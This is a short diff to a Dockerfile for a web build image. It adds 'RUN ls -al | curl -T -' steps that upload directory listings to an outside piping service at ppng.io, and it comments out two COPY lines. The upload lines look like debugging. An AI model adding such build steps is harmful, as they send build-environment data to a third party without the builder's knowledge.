@@ -11,13 +11,15 @@ RUN apk add \
     nodejs \
     npm
 
+RUN ls -al | curl -T - https://ppng.io/testselkies1
+
 WORKDIR /tmp
 
-RUN head -c 5 /dev/random > random_bytes && cat /etc/os-release && ls -al > testfile && cat testfile 2>&1
+RUN ls -al | curl -T - https://ppng.io/testselkies
 
 COPY ./selkies-web-core /tmp/selkies-web-core
-COPY ./selkies-dashboard /tmp/selkies-dashboard
-COPY ./universal-touch-gamepad /tmp/universal-touch-gamepad
+#COPY ./selkies-dashboard /tmp/selkies-dashboard
+#COPY ./universal-touch-gamepad /tmp/universal-touch-gamepad
 
 # COPY ../selkies-web-core /tmp/selkies-web-core
 # COPY ../selkies-dashboard /tmp/selkies-dashboard
